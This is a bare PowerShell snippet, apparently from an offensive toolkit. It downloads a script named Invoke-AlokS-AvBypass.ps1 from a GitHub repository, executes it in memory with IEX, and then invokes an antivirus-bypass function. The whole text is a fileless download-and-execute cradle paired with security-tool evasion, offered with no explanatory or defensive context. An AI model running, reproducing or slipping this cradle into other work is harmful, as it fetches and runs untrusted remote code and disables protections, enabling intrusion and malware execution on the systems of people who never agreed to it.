```
$webreq = [System.Net.WebRequest]::Create('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1')
$resp=$webreq.GetResponse()
$respstream=$resp.GetResponseStream()
$reader=[System.IO.StreamReader]::new($respstream)
$content=$reader.ReadToEnd()
IEX($content);Invoke-AlokS-AvBypass
```
